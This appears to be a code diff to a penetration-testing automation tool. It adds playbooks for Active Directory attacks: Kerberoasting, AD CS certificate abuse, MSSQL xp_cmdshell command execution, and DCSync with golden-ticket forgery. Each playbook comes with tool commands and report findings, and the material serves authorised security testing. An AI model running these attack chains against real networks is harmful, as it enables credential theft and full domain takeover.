@@ -32,7 +32,7 @@ from pathlib import Path
 
 
 # Bump when the built-in playbooks change so existing installs re-seed them.
-_BUILTIN_VERSION = 2
+_BUILTIN_VERSION = 3
 
 # Controlled vocabulary the step builder offers (free text is still allowed).
 # `domain`/`signing`/`host_info` are the reconnaissance variables an early
@@ -40,7 +40,7 @@ _BUILTIN_VERSION = 2
 ARTIFACTS = [
     "domain", "host_info", "signing", "userlist", "credential", "hash", "ticket",
     "spn_hash", "asrep_hash", "shares", "relay_targets", "machine_account",
-    "admin", "flag",
+    "adcs_vuln", "certificate", "mssql_exec", "admin", "flag",
 ]
 # Execution triggers the sequence runner understands (see sequence._trigger_ok).
 # A step fires when its trigger is true against the current variables.
@@ -329,6 +329,110 @@ DEFAULT_PLAYBOOKS = [
                   "Any recovered credential → spray across the AD estate.", "final"),
         ],
     },
+    {
+        "id": "kerberoast-da",
+        "name": "Kerberoast a service account (assumed breach)",
+        "summary": "With one domain credential, roast SPN service accounts and crack "
+                   "them offline — service accounts are often highly privileged.",
+        "match": {"any_ports": [88, 389, 445], "signals": ["username"]},
+        "run": {},
+        "steps": [
+            _step(1, "Fingerprint the DC", "start", "netexec_smb", [],
+                  ["domain", "host_info"],
+                  "Read the domain from the DC (needed by GetUserSPNs)."),
+            _step(2, "Kerberoast SPN accounts", "have credential", "kerberoast",
+                  ["credential", "domain"], ["spn_hash"],
+                  "GetUserSPNs for every SPN account and request their tickets.",
+                  severity="High", cvss="8.1",
+                  finding_title="Kerberoastable Service Accounts",
+                  impact="SPN service accounts can be roasted by any domain user and "
+                         "cracked offline; they are frequently privileged.",
+                  recommendation="Use gMSA or 25+ char random passwords for SPN accounts "
+                         "and enforce AES."),
+            _step(3, "Crack the tickets", "have hashes", "crack_hashes",
+                  ["spn_hash"], ["credential"],
+                  "Crack the krb5tgs hashes offline with john + rockyou."),
+            _step(4, "Confirm the recovered account", "have credential", "netexec_smb",
+                  ["credential"], ["admin", "flag"],
+                  "Authenticate with the cracked service account; watch for Pwn3d!.",
+                  "final", args={"command": "whoami /groups"}),
+        ],
+    },
+    {
+        "id": "adcs-esc",
+        "name": "AD CS abuse (ESC escalation)",
+        "summary": "Find a vulnerable certificate template and enroll a certificate as a "
+                   "privileged user, then authenticate with it to recover their hash/TGT.",
+        "match": {"any_ports": [88, 389, 445], "signals": ["username"]},
+        "run": {},
+        "steps": [
+            _step(1, "Find vulnerable templates", "have credential", "certipy_find",
+                  ["credential", "domain"], ["adcs_vuln"],
+                  "certipy find -vulnerable: enumerate CAs and flag ESC1-ESC8 templates.",
+                  severity="High", cvss="8.1",
+                  finding_title="AD CS Misconfiguration (Vulnerable Certificate Template)",
+                  impact="A vulnerable AD CS template lets a low-privileged user enroll a "
+                         "certificate as another user (e.g. Domain Admin), leading to full "
+                         "domain compromise.",
+                  recommendation="Remove enrollee-supplied-subject (ESC1), restrict "
+                         "enrollment rights, enable manager approval, and audit templates."),
+            _step(2, "Enroll as a privileged user", "have credential",
+                  "certipy_req (set ca/template/upn from step 1)",
+                  ["adcs_vuln", "credential"], ["certificate"],
+                  "certipy req -ca <CA> -template <ESC1> -upn administrator@<domain> → .pfx."),
+            _step(3, "Authenticate with the certificate", "have credential",
+                  "certipy_auth (set pfx from step 2)", ["certificate"], ["credential", "hash"],
+                  "certipy auth -pfx administrator.pfx → NT hash + TGT for the target user.",
+                  "final"),
+        ],
+    },
+    {
+        "id": "mssql-foothold",
+        "name": "MSSQL foothold (xp_cmdshell)",
+        "summary": "Authenticate to MSSQL with a domain credential and gain OS command "
+                   "execution as the service account via xp_cmdshell.",
+        "match": {"any_ports": [1433], "signals": ["username"]},
+        "run": {},
+        "steps": [
+            _step(1, "Authenticate to MSSQL", "have credential", "netexec_mssql",
+                  ["credential", "domain"], [],
+                  "Windows-auth to the SQL instance with a recovered domain credential."),
+            _step(2, "Command execution via xp_cmdshell", "have credential",
+                  "netexec_mssql", ["credential"], ["mssql_exec", "admin"],
+                  "Enable and run xp_cmdshell to execute OS commands as the SQL service "
+                  "account (then abuse SeImpersonate → SYSTEM).", "final",
+                  args={"command": "whoami"},
+                  severity="High", cvss="8.1",
+                  finding_title="MSSQL Command Execution via xp_cmdshell",
+                  impact="A domain credential grants SQL access that enables OS command "
+                         "execution as the service account, a foothold toward SYSTEM.",
+                  recommendation="Restrict SQL logins, disable xp_cmdshell, run SQL under a "
+                         "low-privileged account without SeImpersonate, and patch."),
+        ],
+    },
+    {
+        "id": "domain-dominance",
+        "name": "Domain dominance (DCSync → golden ticket)",
+        "summary": "With a privileged credential, replicate the directory (DCSync/NTDS) "
+                   "and forge a golden ticket for persistence.",
+        "match": {"any_ports": [88, 389, 445], "signals": ["username"]},
+        "run": {},
+        "steps": [
+            _step(1, "DCSync / NTDS dump", "have credential", "secretsdump",
+                  ["credential"], ["hash"],
+                  "Replicate secrets from the DC (SAM/LSA/NTDS incl. krbtgt).",
+                  severity="Critical", cvss="9.8",
+                  finding_title="Domain Credential Replication (DCSync / NTDS Dump)",
+                  impact="A privileged account can replicate every domain secret "
+                         "(all NT hashes incl. krbtgt) — complete domain compromise.",
+                  recommendation="Restrict replication (DS-Replication-Get-Changes) to DCs, "
+                         "tier admin accounts, and rotate krbtgt twice."),
+            _step(2, "Forge a golden ticket", "have hashes",
+                  "ticketer (set krbtgt hash + domain SID)", ["hash"], ["ticket", "admin"],
+                  "ticketer -nthash <krbtgt> -domain-sid <SID> Administrator → golden TGT "
+                  "for full-domain persistence.", "final"),
+        ],
+    },
 
     # ---- finding playbooks (detection + report content) ------------------
     _finding("smb-signing", "SMB Signing Not Enforced", "High", "6.5",
@@ -435,6 +539,15 @@ def _migrate(log_dir, data: list) -> list:
                 if k not in st:
                     st[k] = ""
                     changed = True
+    # Add any built-in playbook that isn't stored yet (new defaults on upgrade),
+    # preserving the operator's existing order and customisations.
+    have = {pb.get("id") for pb in data}
+    for dpb in DEFAULT_PLAYBOOKS:
+        if dpb["id"] not in have:
+            new = copy.deepcopy(dpb)
+            new["_v"] = _BUILTIN_VERSION
+            data.append(new)
+            changed = True
     if changed:
         save(log_dir, data)
     return data
